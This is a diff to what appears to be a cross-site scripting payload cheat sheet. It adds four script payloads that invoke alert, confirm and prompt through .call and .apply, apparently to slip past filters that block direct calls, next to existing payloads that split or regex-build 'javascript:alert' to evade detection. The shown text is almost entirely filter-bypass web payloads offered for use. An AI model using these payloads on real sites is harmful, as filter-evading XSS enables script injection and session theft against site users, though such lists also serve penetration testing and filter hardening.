@@ -185,6 +185,14 @@ Try to use this payloads :
 9) <sVg OnPointerEnter="location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`">
 
 10) <bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click 
+
+11) <script>alert.call(null,1)</script>   (alert.call(%20, "XSS");)
+
+12) <script>confirm.call(null,1)</script>
+
+13) <script>prompt.call(null,1)</script>
+
+14) <script>alert.apply(null, [1])</script>
 ```
 
 ### 4.If space is encoded or deleted
